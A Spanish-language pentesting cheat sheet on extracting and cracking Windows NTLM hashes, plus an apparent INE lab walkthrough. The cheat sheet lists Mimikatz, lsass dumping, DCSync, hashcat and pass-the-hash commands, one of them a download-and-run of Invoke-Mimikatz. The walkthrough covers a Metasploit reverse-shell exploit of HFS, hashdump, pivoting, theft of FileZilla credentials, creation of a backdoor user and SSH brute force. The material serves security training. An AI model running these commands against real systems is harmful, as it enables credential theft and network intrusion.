
# Dumping & Cracking NTLM Hashes

## <mark style="color:purple;">Introducción</mark>

Los hashes NTLM (NT LAN Manager) son credenciales autenticación en entornos Windows que almacenan contraseñas hasheadas. En pruebas de penetración y evaluación de seguridad, obtener y crackear estos hashes es fundamental para:

* **Movimiento lateral**: Usar hashes para autenticarse contra otros sistemas (Pass-the-Hash)
* **Escalada de privilegios**: Identificar cuentas con privilegios elevados
* **Post-explotación**: Mantener persistencia y acceso

Esta guía cubre desde la extracción de hashes hasta su cracking, organizada por escenarios y herramientas.

***

## <mark style="color:purple;">Dumping de Hashes NTLM</mark>

### Desde Sistema en Ejecución

#### **Mimikatz (Herramienta clásica)**

```bash
# Ejecutar como administrador
mimikatz.exe

# Comandos dentro de mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::msv

# Extraer solo hashes NTLM
sekurlsa::logonpasswords | findstr /C:"msv"
```

#### **Meterpreter (Metasploit)**

```bash
# Dentro de meterpreter
hashdump
smart_hashdump

# Para sistemas con UAC
run post/windows/gather/smart_hashdump
```

#### **Invoke-Mimikatz (PowerShell)**

```powershell
# Cargar y ejecutar
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

#### **Impacket SecretsDump**

```bash
# Desde máquina atacante
impacket-secretsdump -hashes :<ntlm_hash> domain/username@target_ip
impacket-secretsdump 'domain/username:password@target_ip'
```

#### **Lsass Dump Manual**

```bash
# Usando Procdump de Sysinternals
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

# Usando Task Manager
# Abrir Task Manager -> Details -> lsass.exe -> Create dump file

# Luego extraer con pypykatz
pypykatz lsa minidump lsass.dmp
```

### Desde SAM (Security Account Manager)

{% content-ref url="/pages/R6QjgH0qNuwUQAgCOVnq" %}
[Atacando a SAM](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/windows-attacks/atacando-a-sam.md)
{% endcontent-ref %}

#### **Reg.exe (Windows)**

```bash
# Volcar SAM y SYSTEM
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
```

#### **Impacket con archivos volcados**

```bash
# Extraer hashes
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

#### **Samdump2 (Linux)**

```bash
# Para sistemas Linux con montaje de disco Windows
samdump2 system.save sam.save
```

### Desde Active Directory

#### **NTDS.dit (Controlador de Dominio)**

```bash
# Volcar NTDS.dit con ntdsutil
ntdsutil
activate instance ntds
ifm
create full C:\ntds_dump
quit
quit

# Extraer con secretsdump
impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes :ntlm_hash domain/username@dc_ip
```

#### **DCSync Attack (Mimikatz)**

```bash
# Simular replicación de dominio
mimikatz "lsadump::dcsync /domain:domain.local /user:krbtgt" exit
mimikatz "lsadump::dcsync /domain:domain.local /all" exit
```

#### **BloodHound + SharpHound**

```bash
# Recolectar datos para identificar objetivos
SharpHound.exe -c All -d domain.local
```

***

### Formato de Hashes NTLM

Los hashes se presentan típicamente en formato:

```bash
username:user_id:LM_hash:NTLM_hash:::
```

Ejemplo:

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
```

* **LM hash**: `aad3b435b51404eeaad3b435b51404ee` indica vacío (moderno)
* **NTLM hash**: `fc525c9683e8fe067095ba2ddc971889` es el hash de 32 caracteres

***

## <mark style="color:purple;">Cracking de Hashes NTLM</mark>

### Hashcat (GPU - Rápido)

#### **Configuración básica**

```bash
# Modo NTLM: 1000
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# Con optimizaciones
hashcat -m 1000 -a 0 -O -w 4 hashes.txt rockyou.txt

# Usar reglas
hashcat -m 1000 -a 0 -r /usr/share/hashcat/rules/best64.rule hashes.txt rockyou.txt

# Mostrar resultados
hashcat -m 1000 --show hashes.txt
```

#### **Ataques específicos**

```bash
# Fuerza bruta (8 caracteres, alfanumérico)
hashcat -m 1000 -a 3 ?a?a?a?a?a?a?a?a

# Combinación de diccionario
hashcat -m 1000 -a 1 hashes.txt dict1.txt dict2.txt

# Ataque de máscara con reglas
hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d?d?d
```

### John the Ripper

```bash
# Modo diccionario
john --format=nt --wordlist=rockyou.txt hashes.txt

# Modo reglas
john --format=nt --wordlist=rockyou.txt --rules=best hashes.txt

# Fuerza bruta incremental
john --format=nt --incremental hashes.txt

# Ver contraseñas crackeadas
john --show --format=nt hashes.txt
```

### Herramientas Especializadas

#### **CrackMapExec con hashes**

```bash
# Probar hash contra múltiples sistemas
crackmapexec smb targets.txt -u administrator -H 'ntlm_hash'

# Con diccionario de hashes
crackmapexec smb targets.txt -u users.txt -H hashes.txt
```

***

## Pass-the-Hash (PtH)

Una vez obtenidos los hashes, úsalos para autenticarte:

#### **Impacket**

```bash
# Ejecución remota
impacket-psexec -hashes :ntlm_hash domain/username@target_ip
impacket-wmiexec -hashes :ntlm_hash domain/username@target_ip

# Shell interactiva
impacket-smbexec -hashes :ntlm_hash domain/username@target_ip
```

#### **CrackMapExec**

```bash
# Ejecutar comandos
crackmapexec smb target_ip -u username -H ntlm_hash -x 'whoami'

# Obtener shell
crackmapexec smb target_ip -u username -H ntlm_hash -M exec -o CMD='powershell.exe'
```

#### **Evil-WinRM**

```bash
evil-winrm -i target_ip -u username -H ntlm_hash
```

#### **xfreerdp**

```bash
xfreerdp /v:target_ip /u:username /pth:ntlm_hash
```

***

## <mark style="color:purple;">Ejemplo Práctico Completo</mark>

```bash
# 1. Obtener hashes desde sistema Windows
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > hashes_raw.txt

# 2. Extraer solo hashes NTLM
grep -i "ntlm" hashes_raw.txt | awk '{print $NF}' > ntlm_hashes.txt

# 3. Crackear con hashcat
hashcat -m 1000 -a 0 -o cracked.txt ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# 4. Ver resultados
cat cracked.txt

# 5. Usar hash crackeado para acceso
impacket-psexec -hashes :ntlm_hash domain/admin@target_ip
```

***

## <mark style="color:purple;">Lab: Windows Post-Explotation</mark>

En este laboratorio aprenderás a encontrar y explotar una aplicación vulnerable. También se abordarán técnicas de post-explotación para extraer información confidencial y realizar maniobras de pivoting.

En este entorno de laboratorio, accederás a una instancia de Kali GUI. Se puede acceder a una aplicación vulnerable en Kali en **`http://demo.ine.local`** y **`http://demo1.ine.local`.**

**Objetivo:** ¡Explotar el objetivo y encontrar la flag!

***

En este laboratorio tenemos 2 objetivos **`http://demo.ine.local`** y **`http://demo1.ine.local`**:

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.18       INE
127.0.0.1 AttackDefense-Kali
10.10.41.6      INE
10.2.28.182    demo.ine.local
10.2.26.26    demo1.ine.local
```

Pero solo tenemos conectividad con `demo.ine.local`, por lo que a la máquina `demo1` deberemos acceder por pivoting.

### Escaneo de puertos

```bash
┌──(root㉿INE)-[~]
└─# nmap -sCV -T4 demo.ine.local                                                                                                                                      

PORT     STATE SERVICE            VERSION
80/tcp   open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1025/tcp open  msrpc              Microsoft Windows RPC
1026/tcp open  msrpc              Microsoft Windows RPC
1027/tcp open  msrpc              Microsoft Windows RPC
1028/tcp open  msrpc              Microsoft Windows RPC
1046/tcp open  msrpc              Microsoft Windows RPC
1047/tcp open  msrpc              Microsoft Windows RPC
1048/tcp open  msrpc              Microsoft Windows RPC
3389/tcp open  ssl/ms-wbt-server
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-28T10:44:01
|_  start_date: 2026-03-28T10:28:07
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
```

Encontramos multitud de puertos, destacando el servicio web expuesto y el servicio SMB.

### Acceso web

Parece que expone una aplicación `HttpFileServer 2.3`. bastante antigua, por lo que seguramente haya algún exploit público:

<figure><img src="/files/tlXG1GHR3PuccecrdETR" alt=""><figcaption></figcaption></figure>

### Búsqueda de exploits

Encontramos un exploit para RCE en el objetivo:

```bash
msfconsole

msf6 > search HttpFileServer 2.3

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) >
```

### Explotación

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts demo.ine.local
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*[*] Started reverse TCP handler on 10.10.41.6:4444 
[*] Using URL: http://10.10.41.6:8080/b9tXDE1
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /b9tXDE1
[*] Sending stage (176198 bytes) to 10.2.28.182
[!] Tried to delete %TEMP%\yWXvWXedfC.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.41.6:4444 -> 10.2.28.182:1107) at 2026-03-28 17:54:15 +0530
[*] Server stopped.

meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Hashdump

Conseguimos el hash del usuario Administrator:

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Parece que no podemos crackear estos hashes directamente, por lo que pasamos al pivoting.

### Pivoting

Desde esta máquina si tenemos conectividad con la máquina `demo1.ine.local`:

```bash
meterpreter > shell

Process 1712 created.
Channel 3 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>ping 10.2.26.26

Pinging 10.2.26.26 with 32 bytes of data:
Reply from 10.2.26.26: bytes=32 time=1ms TTL=128
Reply from 10.2.26.26: bytes=32 time<1ms TTL=128
Reply from 10.2.26.26: bytes=32 time<1ms TTL=128
Reply from 10.2.26.26: bytes=32 time<1ms TTL=128

Ping statistics for 10.2.26.26:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)
```

#### Ver redes internas

Observamos que la red interna es la `10.2.28.0/20`:

```powershell
meterpreter > ifconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

Interface 12
============
Name         : AWS PV Network Device #0
Hardware MAC : 02:e8:24:96:07:dd
MTU          : 9001
IPv4 Address : 10.2.28.182
IPv4 Netmask : 255.255.240.0
IPv6 Address : fe80::703f:4568:ca17:cc9b
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

#### Autoroute

```bash
meterpreter > run autoroute -s 10.2.28.0/20

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.2.28.0/255.255.240.0...
[+] Added route to 10.2.28.0/255.255.240.0 via 10.2.28.182
[*] Use the -p option to list all active routes
```

#### Ver módulos de post-explotación

En Metasploit encontramos muchísimos módulos de post explotación en Windows:

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > search enum windows type:post

Matching Modules
================

   #   Name                                                 Disclosure Date  Rank    Check  Description
   -   ----                                                 ---------------  ----    -----  -----------
   0   post/windows/gather/bitlocker_fvek                   .                normal  No     Bitlocker Master Key (FVEK) Extraction
   1   post/windows/manage/kerberos_tickets                 .                normal  No     Kerberos Ticket Management
   2     \_ action: DUMP_TICKETS                            .                .       .      Dump the Kerberos tickets
   3     \_ action: ENUM_LUIDS                              .                .       .      Enumerate session logon LUIDs
   4     \_ action: SHOW_LUID                               .                .       .      Show the current LUID
   5   post/windows/gather/enum_onedrive                    .                normal  No     OneDrive Sync Provider Enumeration Module
   6   post/windows/gather/enum_putty_saved_sessions        .                normal  No     PuTTY Saved Sessions Enumeration Module
   7   post/windows/gather/enum_ad_to_wordlist              .                normal  No     Windows Active Directory Wordlist Builder
   8   post/windows/gather/enum_av_excluded                 .                normal  No     Windows Antivirus Exclusions Enumeration
   9   post/windows/gather/lsa_secrets                      .                normal  No     Windows Enumerate LSA Secrets
   10  post/windows/gather/enum_ad_bitlocker                .                normal  No     Windows Gather Active Directory BitLocker Recovery
   11  post/windows/gather/enum_ad_computers                .                normal  No     Windows Gather Active Directory Computers
   12  post/windows/gather/enum_ad_groups                   .                normal  No     Windows Gather Active Directory Groups
   13  post/windows/gather/enum_ad_managedby_groups         .                normal  No     Windows Gather Active Directory Managed Groups
   14  post/windows/gather/enum_ad_service_principal_names  .                normal  No     Windows Gather Active Directory Service Principal Names
   15  post/windows/gather/enum_ad_user_comments            .                normal  No     Windows Gather Active Directory User Comments
   16  post/windows/gather/enum_ad_users                    .                normal  No     Windows Gather Active Directory Users
   17  post/windows/gather/enum_tomcat                      .                normal  No     Windows Gather Apache Tomcat Enumeration
   18  post/windows/gather/enum_patches                     .                normal  No     Windows Gather Applied Patches
   19  post/windows/gather/credentials/enum_cred_store      .                normal  No     Windows Gather Credential Store Enumeration and Decryption Module
   20  post/windows/gather/credentials/enum_laps            .                normal  No     Windows Gather Credentials Local Administrator Password Solution
   21  post/windows/gather/enum_db                          .                normal  No     Windows Gather Database Instance Enumeration
<----SNIP---->
```

#### Enumeración de aplicaciones

Usaremos el siguiente módulo para enumerar las aplicaciones dentro de la sesión de Meterpreter:

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > search enum_applications

Matching Modules
================

   #  Name                                   Disclosure Date  Rank    Check  Description
   -  ----                                   ---------------  ----    -----  -----------
   0  post/windows/gather/enum_applications  .                normal  No     Windows Gather Installed Application Enumeration

Interact with a module by name or index. For example info 0, use 0 or use post/windows/gather/enum_applications

msf6 exploit(windows/http/rejetto_hfs_exec) > use 0
msf6 post(windows/gather/enum_applications) > set session 1
msf6 post(windows/gather/enum_applications) > run

[*] Enumerating applications installed on ATTACKDEFENSE

Installed Applications
======================

 Name                                                                Version
 ----                                                                -------
 AWS Tools for Windows                                               3.15.1494
 Amazon SSM Agent                                                    3.1.338.0
 EC2ConfigService                                                    4.9.4508.0
 FileZilla Client 3.57.0                                             3.57.0
 Google Chrome                                                       96.0.4664.110
 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913  14.28.29913.0
 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.29.30040  14.29.30040.0
 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.29.30040      14.29.30040
 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.29.30040         14.29.30040
 Nmap 7.92                                                           7.92
 Npcap                                                               1.50
 Python Launcher                                                     3.10.7644.0
 aws-cfn-bootstrap                                                   2.0.6
```

Vemos que tenemos nmap instalado en `demo.ine.local`, lo que nos permite escanear los puertos de `demo1.ine.local`.

#### Enumeración de contraseñas

Vemos que tenemos instalado `FileZilla Client`, y podemos usar el siguiente módulo para intentar extraer la contraseña:

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > search filezilla_client_cred

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  post/multi/gather/filezilla_client_cred  .                normal  No     Multi Gather FileZilla FTP Client Credential Collection


Interact with a module by name or index. For example info 0, use 0 or use post/multi/gather/filezilla_client_cred

msf6 exploit(windows/http/rejetto_hfs_exec) > use 0
msf6 post(multi/gather/filezilla_client_cred) > set session 1
msf6 post(multi/gather/filezilla_client_cred) > exploit

[*] Checking for Filezilla directory in: C:\Users\Administrator\AppData\Roaming
[*] Found C:\Users\Administrator\AppData\Roaming\FileZilla
[*] Reading sitemanager.xml and recentservers.xml files from C:\Users\Administrator\AppData\Roaming\FileZilla
[*] Parsing sitemanager.xml
[*]     Collected the following credentials:
[*]     Server: 10.2.30.208:21
[*]     Protocol: FTP
[*]     Username: admin
[*]     Password: FTPStrongPwd

[*] Parsing recentservers.xml
[*]     Collected the following credentials:
[*]     Server: 10.2.30.208:21
[*]     Protocol: FTP
[*]     Username: admin
[*]     Password: FTPStrongPwd

[*] Post module execution completed
```

Encontramos la contraseña en plano del usuario admin, y podríamos usarla para acceder por FTP en demo1.ine.local.

### Habilitar socks Proxy

{% hint style="warning" %}
Necesitamos configurarlo con el puerto y versión habilitado en proxychains, por defecto 9050 versión 4a
{% endhint %}

```bash
msf6 post(multi/gather/filezilla_client_cred) > search socks_proxy

Matching Modules
================

   #  Name                          Disclosure Date  Rank    Check  Description
   -  ----                          ---------------  ----    -----  -----------
   0  auxiliary/server/socks_proxy  .                normal  No     SOCKS Proxy Server


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/server/socks_proxy

msf6 post(multi/gather/filezilla_client_cred) > use 0
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
msf6 auxiliary(server/socks_proxy) > exploit

[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
```

### Escaneo de puertos

```bash
┌──(root㉿INE)-[~]
└─# proxychains nmap -sT -Pn -p1-50 demo1.ine.local
                                                                                                           
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-28 17:36 IST
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.30.208:23 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.30.208:21  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.30.208:22  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.30.208:25 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.30.208:37 <--denied
<-----SNIP--->
Nmap scan report for demo1.ine.local (10.2.30.208)
Host is up (1.1s latency).
Not shown: 48 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

Encontramos abiertos los puertos 21 (FTP) y 22 (SSH).

### Acceso FTP

Accedemos con la contraseña que extraímos anteriormente:

```bash
┌──(root㉿INE)-[~]
└─# proxychains ftp admin@demo1.ine.local

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.30.208:21  ...  OK
Connected to demo1.ine.local.
220-FileZilla Server 1.2.0
220 Please visit https://filezilla-project.org/
331 Please, specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
229 Entering Extended Passive Mode (|||49443|)
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.30.208:49443  ...  OK
150 Starting data transfer.
drwxrwxrwx 1 ftp ftp               0 May 21  2014 AccountPictures
drwxrwxrwx 1 ftp ftp               0 Jan 11  2022 Desktop
-rw-rw-rw- 1 ftp ftp             174 Aug 22  2013 desktop.ini
drwxrwxrwx 1 ftp ftp               0 Aug 22  2013 Documents
drwxrwxrwx 1 ftp ftp               0 Aug 22  2013 Downloads
drwxrwxrwx 1 ftp ftp               0 Aug 22  2013 Libraries
drwxrwxrwx 1 ftp ftp               0 Aug 22  2013 Music
drwxrwxrwx 1 ftp ftp               0 Aug 22  2013 Pictures
-rw-rw-rw- 1 ftp ftp              32 Jan 11  2022 usernames.txt
drwxrwxrwx 1 ftp ftp               0 Aug 22  2013 Videos
226 Operation successful

ftp> get usernames.txt
local: usernames.txt remote: usernames.txt
229 Entering Extended Passive Mode (|||49449|)
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.30.208:49449  ...  OK
150 Starting data transfer.
100% |*************************************************************************************************************************|    32        0.10 KiB/s    00:00 ETA
226 Operation successful
```

Solo encontramos un archivo de usernames interesante, no hay nada más:

```bash
┌──(root㉿INE)-[~]
└─# cat usernames.txt
                                                                                                                                             
administrator
sysadmin
student
```

### Crear usuario&#x20;

Desde nuestra sesión SYSTEM vamos a crear un usuario y añadirlo al grupo "Remote Desktop Users" para poder acceder por RDP al host:

```bash
meterpreter > shell

Process 3860 created.
Channel 12 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32> net user guest_1 guestpwd /add
The command completed successfully.

C:\Windows\system32> net localgroup "Remote Desktop Users" guest_1 /add
The command completed successfully.
```

Lo comprobamos con:

```bash
C:\Windows\system32> net user

User accounts for \\
-------------------------------------------------------------------------------
Administrator            Guest                    guest_1 
```

### Acceso RDP

Accederemos a `demo.ine.local` para tener un mejor control del objetivo principal:

```bash
┌──(root㉿INE)-[~]
└─# xfreerdp /u:guest_1 /p:guestpwd /v:demo.ine.local
```

<figure><img src="/files/LMu6jA46X8PzEB8Ka5Xi" alt=""><figcaption></figcaption></figure>

### Acceso SSH

Vamos a hacer un bruteforce al SSH de `demo1.ine.local`. Para ello primero habilitaremos el port forwarding SSH.

#### Habilitar Port Forwarding

```bash
meterpreter > portfwd add -l 1234 -p 22 -r 10.2.26.26
[*] Forward TCP relay created: (local) :1234 -> (remote) 10.2.26.26:22
```

#### Hydra SSH Bruteforce

```bash
──(root㉿INE)-[~]
└─# proxychains hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo1.ine.local ssh

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-28 18:14:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1009 login tries (l:1/p:1009), ~64 tries per task
[DATA] attacking ssh://demo1.ine.local:22/
[22][ssh] host: demo1.ine.local   login: administrator   password: password1
1 of 1 target successfully completed, 1 valid password found
```

Tenemos la contraseña en plano del usuario administrator!

#### Acceso SSH

```bash
┌──(root㉿INE)-[~]
└─# proxychains ssh administrator@demo1.ine.local
                                                                                                               
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.26.26:22  ...  OK
The authenticity of host 'demo1.ine.local (10.2.26.26)' can't be established.
ED25519 key fingerprint is SHA256:t9/BQIr/f97tt0HUUDdP9pzIVejCajA+2+LvUDqorVM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'demo1.ine.local' (ED25519) to the list of known hosts.
administrator@demo1.ine.local's password: 
Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.                                                                            

administrator@ATTACKDEFENSE C:\Users\Administrator>whoami                                                                       
attackdefense\administrator 
```

#### Acceso a la flag

```powershell
administrator@ATTACKDEFENSE C:\Users\Administrator> cd c:/                                                                                                             
                                                                                                                                                                      
administrator@ATTACKDEFENSE c:\>dir                                                                                                                                   
 Volume in drive C has no label.                                                                                                                                      
 Volume Serial Number is 5CD6-020B                                                                                                                                    
                                                                                                                                                                      
 Directory of c:\                                                                                                                                                     
                                                                                                                                                                      
01/11/2022  08:52 PM                32 FLAG1.txt                                                                                                                      
08/22/2013  03:52 PM    <DIR>          PerfLogs                                                                                                                       
01/11/2022  08:31 PM    <DIR>          Program Files                                                                                                                  
01/04/2022  04:24 AM    <DIR>          Program Files (x86)                                                                                                            
12/31/2021  09:50 AM    <DIR>          Users                                                                                                                          
01/04/2022  03:37 AM    <DIR>          Windows                                                                                                                        
               1 File(s)             32 bytes                                                                                                                         
               5 Dir(s)   6,546,345,984 bytes free                                                                                                                    
                                                                                                                                                                      
administrator@ATTACKDEFENSE c:\>type FLAG1.txt                                                                                                                        
a3dcb4d229de6fde0db5686d********
```
